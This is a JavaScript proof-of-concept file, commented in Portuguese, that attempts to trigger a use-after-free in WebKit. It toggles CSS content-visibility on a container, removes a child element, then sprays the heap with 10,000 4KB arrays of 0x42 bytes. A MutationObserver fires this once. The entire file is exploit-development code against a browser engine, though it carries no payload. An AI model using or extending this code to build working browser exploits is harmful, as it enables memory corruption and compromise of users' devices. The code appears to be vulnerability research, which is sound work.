// js/uaf_webkit_poc/poc.js
import { debug_log } from './module/utils.mjs';

let uafCoreLogicHasRun = false;

// A função heapSpray agora sempre fará o spray massivo para este teste.
function heapSpray() {
  let spray = [];
  const sprayIterations = 10000; // Voltando para 10.000 iterações
  
  const sprayPatternQWORD = [0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42]; 
  
  console.log(`[POC CONSOLE] Iniciando heapSpray com ${sprayIterations} iterações...`);
  // O debug_log para o início do spray foi movido para dentro da triggerUAF para melhor timing.
  // debug_log(`Iniciando heapSpray AGRESSIVO com ${sprayIterations} iterações e padrão QWORD [0x42...]...`);

  for (let i = 0; i < sprayIterations; i++) {
    let arr = new Uint8Array(0x1000); // 4KB
    for (let j = 0; j < arr.length; j++) {
      arr[j] = sprayPatternQWORD[j % sprayPatternQWORD.length];
    }
    spray.push(arr);
  }
  console.log(`[POC CONSOLE] heapSpray concluído.`);
  return spray;
}

export function triggerUAF() {
  console.log("[POC CONSOLE] triggerUAF: Início da função.");

  const currentContainer = document.querySelector(".container");

  if (!currentContainer) {
    console.error("[POC CONSOLE] triggerUAF: Elemento .container não encontrado!");
    debug_log("Erro Crítico: Elemento .container não encontrado para UAF.");
    return;
  }
  console.log("[POC CONSOLE] triggerUAF: .container encontrado.");

  if (uafCoreLogicHasRun && document.getElementById('runUAFBtn') && document.getElementById('runUAFBtn').disabled) {
    console.warn("[POC CONSOLE] triggerUAF: UAF já foi tentado.");
    debug_log("UAF já foi tentado (botão desabilitado). Recarregue a página para um novo teste completo.");
    return;
  }
  console.log("[POC CONSOLE] triggerUAF: Verificação uafCoreLogicHasRun passou.");

  const currentChild = currentContainer.querySelector(".child");
  console.log(`[POC CONSOLE] triggerUAF: .child ${currentChild ? 'encontrado' : 'NÃO encontrado'}.`);

  debug_log("Iniciando tentativa de UAF (TESTE SPRAY MASSIVO): contentVisibility=hidden...");
  console.log("[POC CONSOLE] triggerUAF: Definindo currentContainer.style.contentVisibility = 'hidden'");
  currentContainer.style.contentVisibility = "hidden";
  console.log("[POC CONSOLE] triggerUAF: contentVisibility definido para 'hidden'.");

  if (currentChild) {
    debug_log("Elemento .child encontrado, removendo-o.");
    console.log("[POC CONSOLE] triggerUAF: Removendo .child...");
    currentChild.remove();
    console.log("[POC CONSOLE] triggerUAF: .child removido.");
  } else {
    debug_log("Elemento .child já foi removido ou não encontrado inicialmente.");
    console.log("[POC CONSOLE] triggerUAF: .child não encontrado para remoção (já removido?).");
  }

  uafCoreLogicHasRun = true; 
  const uafButton = document.getElementById('runUAFBtn');
  if(uafButton) {
      uafButton.disabled = true;
      debug_log("Botão de UAF desabilitado. Recarregue a página para um novo teste completo.");
      console.log("[POC CONSOLE] triggerUAF: Botão UAF desabilitado.");
  }

  console.log("[POC CONSOLE] triggerUAF: Agendando setTimeout...");
  setTimeout(() => {
    console.log("[POC CONSOLE] setTimeout callback: Início.");
    debug_log("Continuando UAF (TESTE SPRAY MASSIVO): contentVisibility=auto, heapSpray()...");
    
    if (document.body.contains(currentContainer)) {
        console.log("[POC CONSOLE] setTimeout: Definindo currentContainer.style.contentVisibility = 'auto'");
        currentContainer.style.contentVisibility = "auto";
        console.log("[POC CONSOLE] setTimeout: contentVisibility definido para 'auto'.");
    } else {
        console.error("[POC CONSOLE] setTimeout: Container foi removido do DOM!");
        debug_log("Container foi removido do DOM antes de contentVisibility='auto'.");
        return;
    }
    
    // Log ANTES do spray massivo
    debug_log(`Iniciando heapSpray AGRESSIVO com 10000 iterações e padrão QWORD [0x42...]...`);
    console.log(`[POC CONSOLE] setTimeout: Iniciando heapSpray(10000)...`);
    let sprayArrays = heapSpray(); // Spray massivo (10000 iterações)
    console.log(`[POC CONSOLE] setTimeout: heapSpray(10000) concluído.`);

    if(sprayArrays.length > 0) {
        debug_log(`Heap spray AGRESSIVO realizado com ${sprayArrays.length} arrays (padrão QWORD [0x42...]).`);
    }
    debug_log("Tentativa de UAF (TESTE SPRAY MASSIVO) concluída.");
    console.log("[POC CONSOLE] setTimeout: Tentativa UAF com spray MASSIVO concluída.");

    // ##### BLOCO DE INTERAÇÕES AGRESSIVAS PERMANECE COMENTADO #####
    /*
    if (document.body.contains(currentContainer)) {
        // ... (código das interações agressivas) ...
    }
    */
    // ##### FIM DO BLOCO COMENTADO #####

  }, 0); // setTimeout
  console.log("[POC CONSOLE] triggerUAF: setTimeout agendado. Fim da função principal.");
}

// Configuração do MutationObserver (continua one-shot para a lógica principal)
const initialContainerForObserver = document.querySelector(".container");
if (initialContainerForObserver) {
    const observer = new MutationObserver((mutationsList, obs) => {
      if (!uafCoreLogicHasRun) { 
        console.log("[POC CONSOLE] MutationObserver: Acionado, chamando triggerUAF...");
        debug_log("MutationObserver: DOM tree modified, chamando triggerUAF (primeira vez via observer)...");
        triggerUAF();
        obs.disconnect(); 
        debug_log("MutationObserver desconectado.");
        console.log("[POC CONSOLE] MutationObserver: Desconectado.");
      } else {
        console.log("[POC CONSOLE] MutationObserver: Acionado, mas UAF já rodou. Desconectando.");
        obs.disconnect(); 
      }
    });
    observer.observe(initialContainerForObserver, { childList: true, subtree: true });
    console.log("[POC CONSOLE] MutationObserver configurado.");
} else {
    console.warn("[POC CONSOLE] Elemento .container inicial não encontrado para MutationObserver.");
}
